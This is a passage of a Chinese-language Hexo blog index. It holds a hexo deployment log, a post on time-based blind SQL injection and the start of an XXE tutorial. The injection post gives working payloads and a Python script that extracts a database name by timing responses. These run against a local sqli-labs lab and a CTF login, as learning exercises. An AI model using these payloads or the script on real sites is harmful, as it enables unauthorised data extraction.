class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d</span><br><span class="line">INFO  Deploying: git</span><br><span class="line">INFO  Clearing .deploy_git folder...</span><br><span class="line">INFO  Copying files from public folder...</span><br><span class="line">INFO  Copying files from extend dirs...</span><br><span class="line">warning: LF will be replaced by CRLF in <span class="number">2020</span>/<span class="number">02</span>/<span class="number">01</span>/hello-world/index.html.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in archives/<span class="number">2020</span>/<span class="number">02</span>/index.html.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in archives/<span class="number">2020</span>/index.html.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in archives/index.html.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in index.html.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in css/Annie.css.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in css/comment.css.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in js/leancloud-count.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in js/main.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in js/search.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/chinese/chinese.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/clipboard/clipboard.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/comment/valine.min.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/fancybox/jquery.fancybox.css.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/fancybox/jquery.fancybox.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/gallerypage/natural-gallery.full.css.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/gallerypage/natural-gallery.full.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/gallerypage/natural.css.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/imagelazyloader/yall.min.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/imageloaded/imagesloaded.pkgd.min.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/jquery/jquery.min.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/leancloud/av-min.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/motto/motto.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/nicescroll/jquery.nicescroll.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/resizediv/resizediv.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/search/ziploader.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">warning: LF will be replaced by CRLF in plugin/toc/katelog.min.js.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line">[master <span class="number">20686</span>db] Site updated: <span class="number">2020</span><span class="number">-02</span><span class="number">-01</span> <span class="number">17</span>:<span class="number">40</span>:<span class="number">09</span></span><br><span class="line"> <span class="number">70</span> files changed, <span class="number">25502</span> insertions(+), <span class="number">5825</span> deletions(-)</span><br><span class="line"> rewrite <span class="number">2020</span>/<span class="number">02</span>/<span class="number">01</span>/hello-world/index.html (<span class="number">70</span>%)</span><br><span class="line"> rewrite archives/<span class="number">2020</span>/<span class="number">02</span>/index.html (<span class="number">94</span>%)</span><br><span class="line"> rewrite archives/<span class="number">2020</span>/index.html (<span class="number">94</span>%)</span><br><span class="line"> rewrite archives/index.html (<span class="number">94</span>%)</span><br><span class="line"> create mode <span class="number">100644</span> css/Annie.css</span><br><span class="line"> create mode <span class="number">100644</span> css/comment.css</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/fonts/FontAwesome.otf</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/fonts/fontawesome-webfont.eot</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/fonts/fontawesome-webfont.svg</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/fonts/fontawesome-webfont.ttf</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/fonts/fontawesome-webfont.woff</span><br><span class="line"> create mode <span class="number">100644</span> css/fonts/icomoon.eot</span><br><span class="line"> create mode <span class="number">100644</span> css/fonts/icomoon.svg</span><br><span class="line"> create mode <span class="number">100644</span> css/fonts/icomoon.ttf</span><br><span class="line"> create mode <span class="number">100644</span> css/fonts/icomoon.woff</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/images/banner.jpg</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> css/style.css</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/blank.gif</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/fancybox_loading.gif</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/fancybox_loading@<span class="number">2</span>x.gif</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/fancybox_overlay.png</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/fancybox_sprite.png</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/fancybox_sprite@<span class="number">2</span>x.png</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/helpers/fancybox_buttons.png</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/helpers/jquery.fancybox-buttons.css</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/helpers/jquery.fancybox-buttons.js</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/helpers/jquery.fancybox-media.js</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/helpers/jquery.fancybox-thumbs.css</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/helpers/jquery.fancybox-thumbs.js</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/jquery.fancybox.css</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/jquery.fancybox.js</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> fancybox/jquery.fancybox.pack.js</span><br><span class="line"> create mode <span class="number">100644</span> img/Annie_qq_qrcode.jpg</span><br><span class="line"> create mode <span class="number">100644</span> img/cart_cover.jpg</span><br><span class="line"> create mode <span class="number">100644</span> img/favicon.ico</span><br><span class="line"> create mode <span class="number">100644</span> img/header-bg.jpg</span><br><span class="line"> create mode <span class="number">100644</span> img/lazy.gif</span><br><span class="line"> create mode <span class="number">100644</span> img/logo.png</span><br><span class="line"> create mode <span class="number">100644</span> img/quote/danger.svg</span><br><span class="line"> create mode <span class="number">100644</span> img/quote/info.svg</span><br><span class="line"> create mode <span class="number">100644</span> img/quote/quote-left.svg</span><br><span class="line"> create mode <span class="number">100644</span> img/quote/success.svg</span><br><span class="line"> create mode <span class="number">100644</span> img/quote/warning.svg</span><br><span class="line"> rewrite index.html (<span class="number">96</span>%)</span><br><span class="line"> create mode <span class="number">100644</span> js/leancloud-count.js</span><br><span class="line"> create mode <span class="number">100644</span> js/main.js</span><br><span class="line"> <span class="built_in">delete</span> mode <span class="number">100644</span> js/script.js</span><br><span class="line"> create mode <span class="number">100644</span> js/search.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/chinese/chinese.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/clipboard/clipboard.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/comment/valine.min.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/fancybox/jquery.fancybox.css</span><br><span class="line"> create mode <span class="number">100644</span> plugin/fancybox/jquery.fancybox.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/data.json</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/images/<span class="keyword">default</span>-skin.png</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/images/<span class="keyword">default</span>-skin.svg</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/images/preloader.gif</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/natural-gallery.full.css</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/natural-gallery.full.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/gallerypage/natural.css</span><br><span class="line"> create mode <span class="number">100644</span> plugin/imagelazyloader/yall.min.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/imageloaded/imagesloaded.pkgd.min.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/jquery/jquery.min.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/leancloud/av-min.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/love/love.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/motto/motto.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/nicescroll/jquery.nicescroll.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/resizediv/resizediv.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/search/ziploader.js</span><br><span class="line"> create mode <span class="number">100644</span> plugin/toc/katelog.min.js</span><br><span class="line">Enumerating objects: <span class="number">94</span>, done.</span><br><span class="line">Counting objects: <span class="number">100</span>% (<span class="number">94</span>/<span class="number">94</span>), done.</span><br><span class="line">Delta compression using up to <span class="number">12</span> threads</span><br><span class="line">Compressing objects: <span class="number">100</span>% (<span class="number">61</span>/<span class="number">61</span>), done.</span><br><span class="line">Writing objects: <span class="number">100</span>% (<span class="number">78</span>/<span class="number">78</span>), <span class="number">1.62</span> MiB | <span class="number">236.00</span> KiB/s, done.</span><br><span class="line">Total <span class="number">78</span> (delta <span class="number">5</span>), reused <span class="number">0</span> (delta <span class="number">0</span>)</span><br><span class="line">remote: Resolving deltas: <span class="number">100</span>% (<span class="number">5</span>/<span class="number">5</span>), done.</span><br><span class="line">To https:<span class="comment">//github.com/zxcv0221/zxcv0221.github.io.git</span></span><br><span class="line">   d8a3c48.<span class="number">.20686</span>db  HEAD -&gt; master</span><br><span class="line">Branch <span class="string">&#x27;master&#x27;</span> set up to track remote branch <span class="string">&#x27;master&#x27;</span> from <span class="string">&#x27;https://github.com/zxcv0221/zxcv0221.github.io.git&#x27;</span>.</span><br><span class="line">[<span class="number">32</span>mINFO [<span class="number">39</span>m Deploy done: [<span class="number">35</span>mgit[<span class="number">39</span>m</span><br></pre></td></tr></table></figure><p>出现这样的界面就算成功了。<br>但是我的恰好不是这样的：<br>我的输入<code>hexo g</code>和<code>hexo</code>后是这样的，<br><img src="https://img-blog.csdnimg.cn/20200201184042707.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看着网上的教程人家改主题也没这么费劲啊~~，为什么问题总找我，不过无所不知的度娘给了我解决办法，<br>问题：如果出现<code>WARN no layout:index.html</code>?&gt;&lt;?<br>解决办法：只要把theme下的文件名改为主题名就行。我这里把它改成了<code>hexo-theme-Annie</code>.</p><h6 id="如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。"><a href="#如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。" class="headerlink" title="如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。"></a>如果这些都做了，还是没有变化，还有一个办法，那就是把theme目录下的那个包含主题的文件删了重新下载。</h6><p>问题终于解决了，呼~~，挺费劲的。也不枉我昨天熬到凌晨两点多，很高兴，终于就要完成了，<img src="https://img-blog.csdnimg.cn/20200201190631819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这次学习学到很多,最重要的就是要不断尝试，不能气馁。虽然过程中心情非常急，但是，做完之后会有一种成就感。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具人 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尝试时间盲注get和post</title>
      <link href="/2020/08/23/%E5%B0%9D%E8%AF%95%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8get%E5%92%8Cpost/"/>
      <url>/2020/08/23/%E5%B0%9D%E8%AF%95%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8get%E5%92%8Cpost/</url>
      
        <content type="html"><![CDATA[<p>时间盲注概念（百度经验）： MySQL基于时间盲注的原理分析，注入SQL语句执行后不提示真假，也不能通过页面内容来进行判断，通过构造SQL语句注入，查看页面响应的时间来判断信息为时间盲注。</p><h3 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h3><p><code>if(payload,true,false)</code>如果payload是正确的，那就执行true，否则就执行false。<br><code>sleep()</code>这个函数有一个参数，可以延迟输出，可以根据它是否延迟相应的时间来判断语句正确还是错误。</p><h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><h5 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h5><p>（1）<code>get</code>举例：sqli-labs-10<br>这个跟之前判断的语句不一样，因为这一关它不管是输入<code>&#39;</code>还是<code>&quot;</code>都是一个结果，所以这里要变化一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=1,sleep(5),0)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>这里我把时间设置的比较长了一点，3秒的话，我还真看不出来😂😂😂。<br>这个加载很快，再试试双引号，可以。这样就知道闭合符号是双引号。<br>然后，这个用脚本跑一下，目前还不会写脚本，<strong>借</strong>（咳咳，那不叫偷拿，我们学习呢。😎😎😎这句话出来估计又要找打了。）学长写的脚本先试试感觉。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!-*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!@lime    :   13:03</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!@Author  : Augenstern</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!@File    : .py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">chars = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.&#x27;</span></span><br><span class="line"></span><br><span class="line">resualt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> length</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    lengthUrl = <span class="string">&#x27;http://127.0.0.1/sqli-labs-master/Less-10/?id=1&quot; and if(length(database())&gt;&#123;0&#125;,1,sleep(5))--+&#x27;</span></span><br><span class="line">    lengthUrlFormat = lengthUrl.format(l)</span><br><span class="line">    start_time0 = time.time()</span><br><span class="line">    rsp0 = requests.get(lengthUrlFormat, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> time.time() - start_time0 &gt; <span class="number">2.5</span>:</span><br><span class="line">        print(<span class="string">&#x27;result length is &#x27;</span> + str(l))</span><br><span class="line">        <span class="keyword">global</span> length</span><br><span class="line">        length = l</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        charAscii = ord(char)</span><br><span class="line"></span><br><span class="line">        url = <span class="string">&#x27;http://127.0.0.1/sqli-labs-master/Less-10/?id=1&quot; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,1,sleep(5))--+&#x27;</span></span><br><span class="line">        urlformat = url.format(i, charAscii)</span><br><span class="line"></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        rsp = requests.get(urlformat, headers=headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">            resualt += char</span><br><span class="line">            print(<span class="string">&#x27;resualt: &#x27;</span>, resualt)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;resualt is &#x27;</span> + resualt)</span><br></pre></td></tr></table></figure><p>过程有点慢，但总比手注快多了。看下结果：<br><img src="https://img-blog.csdnimg.cn/20200311131628706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这脚本真棒。为了证明我这脚本小子不止会<del>偷</del> ，呸，借！！！，我还认真的去看了。</p><h6 id="运行之前的检查"><a href="#运行之前的检查" class="headerlink" title="运行之前的检查"></a>运行之前的检查</h6><p>对了，因为第一次看脚本，犯了很沙雕的错误，一上午就在查。当时一下子整懵B了。<br>跑脚本之前，先加第三方库，像这个脚本，就是要添加<code>request</code>，<code>response</code>，<code>length</code>,至于<code>time</code>，我刚开始也去添加了，发现添加不了，一直出错，然后就到百度去查，有的说，用pip添加再导入，反正乱七八糟的说啥的都有，把我这个小萌新整成小懵B了。到最后我才发现，这是不用添加的，简直气死               <img src="https://img-blog.csdnimg.cn/20200311132928961.jpg" alt="在这里插入图片描述" loading="lazy"><br>time是Python自带的库。就这………………<br>还有，别像这样拿到一个脚本就去跑，有些基本的东西还是要改的，比如：文件头（就那个叫headers的家伙）、然后就是url，别人的url不一定就跟你的一样，我们学长的就跟我们不一样，人家是Mac，（有钱，酸了）。<br>还有一种情况：<br><img src="https://img-blog.csdnimg.cn/2020031114221240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>由于目标计算机积极拒绝，无法连接。这个网上说啥的都有，然后我就又懵B了，什么添加端口监视服务的什么乱七八糟的。给我整得头大。<br>然后，解决办法呢，就是看看文件头改了没，url改了没。仅此而已……<br>文件头<br><img src="https://img-blog.csdnimg.cn/20200311133838914.png" loading="lazy"><br>这个在源码里可以找到，随便找个网站就可以，这里我拿百度当例子；f12,再点network<br><img src="https://img-blog.csdnimg.cn/20200311140749527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>随便选择一个，点开，在最下方找到<code>User-agent</code><br><img src="https://img-blog.csdnimg.cn/20200311140056825.png" alt="在这里插入图片描述" loading="lazy"><br>还有其他的办法，用burp抓包，也是随便找个网站抓包，还拿百度来试验；<br><img src="https://img-blog.csdnimg.cn/20200311141538383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个也可以。两种办法，任意选择。<br>好了，这下就可以跑脚本了。<br>脚本大意：<br><code>import</code>作用是导入。<br>可以用来导入一个数据，或者一个库。在这里，就是导入库的意思，在这里导入requests、time、string、sys这几个库。<br><code>header</code>跟http协议有关，请求头，里面包含的是请求头信息。而这个信息我们可以找到我们电脑的按照上面那两个方法。<br><code>global length</code> 说明length是个全局变量，如果想要为一个定义在函数外的变量赋值，那么就得告诉Python这个变量名不是局部的，而是 全局 的。我们使用global语句完成这一功能。没有global语句，是不可能为定义在函数外的变量赋值的。<br>一个循环<code>for l in range(1,20)</code>一般的数据库名长度不会大于20，这里用20就可以了，太大的跑的时间太长。在<code>lengthUrl</code>里添加SQL语句，然后format函数是一个格式化函数，具体作用不再多说。<br><code>start_time()</code>是设置的最初始的时间，如果加载好网页所用的时间减去初始时间大于2.5s了，网页加载有延迟了，那么就证明这个是对的。然后就打印结果的长度。<br>又是一个循环，这个是爆数据库名了，<code>order()</code>函数将ASCII码转换为数字，下面再次更改url，还是设置一个初始时间，因为在开始的时候，设置了resualt,所以这里就每得出一个结果，就加上之前的字符串，打印出来。最后再打印出来最后一次循环的结果。<br>这就是我个人对这个脚本的理解，如果有不对的地方请大佬指正。</p><h5 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h5><p>看下题：<br><img src="https://img-blog.csdnimg.cn/20200309221057600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这张图片哈哈哈，专门截进来，我喜欢这个。🤣🤣🤣🤣<br>开始解题：先f12看看有没有什么信息（😂😂这里一般会有点提示的），找到了，注释………………<br><img src="https://img-blog.csdnimg.cn/20200309221306587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>嗯，这里我用burp抓包了，先抓包，<br>抓到之后，改成这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=qwzf&#x27; and if(1=2,0,sleep(5))<span class="comment">--+&amp;password=</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200309224359350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里用单引号加载延迟了5秒，可以判断闭合符号是单引号。<br>2.判断库的长度。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=qwzf&#x27; and if(length(database())=&#x27;10&#x27;,sleep(5),0)<span class="comment">--+&amp;password=</span></span><br></pre></td></tr></table></figure><p>使用二分法比较快。<br><img src="https://img-blog.csdnimg.cn/20200309224051707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>数据库的长度出来了，是10。<br>然后可以用burp来一个一个猜库名，也比手注要省力。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=qwzf&#x27; and if(ascii(substr(database(),1,1))=99,sleep(5),0)<span class="comment">--+&amp;password=qwzf</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200312192120919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>看那个箭头指的地方，那是网页加载的时间吗，可以根据那里进行判断。其他就不再废话了。<br>我原本想着burp应该可以直接爆这些库名什么的。可是我不会，我一直以为是我操作的问题，就一直查啊，看了好多博客，都没有人用burp去爆破，今天聊天的时候，我问了一下，这个只能一个一个判断，没有省事的办法，然后我就不纠结了。这个问题烦了我两天。这个都是用脚本跑的。就这样吧，白白纠结了两天。啥也不是。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞基础及简单利用</title>
      <link href="/2020/08/23/XXE%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
      <url>/2020/08/23/XXE%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习XXE，其实前段时间写过一篇关于XXE的，但是由于不可描述的原因，我那篇博客原稿没有了。再总结一次，这次做好了备份。</p><h1 id="XXE基础"><a href="#XXE基础" class="headerlink" title="XXE基础"></a>XXE基础</h1><h2 id="xxe概念"><a href="#xxe概念" class="headerlink" title="xxe概念"></a>xxe概念</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>，也就是xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p><h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML指可扩展标记语言。<br>XML被设计用来传输和存储数据。<br>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构。<br>语法规则：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XML文档必须有一个根元素</span><br><span class="line">XML元素都必须有一个关闭标签</span><br><span class="line">XML标签对大小写敏感</span><br><span class="line">XML元素必须被正确的嵌套</span><br><span class="line">XML属性必须加引导</span><br></pre></td></tr></table></figure><p>一个XML样例看一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span 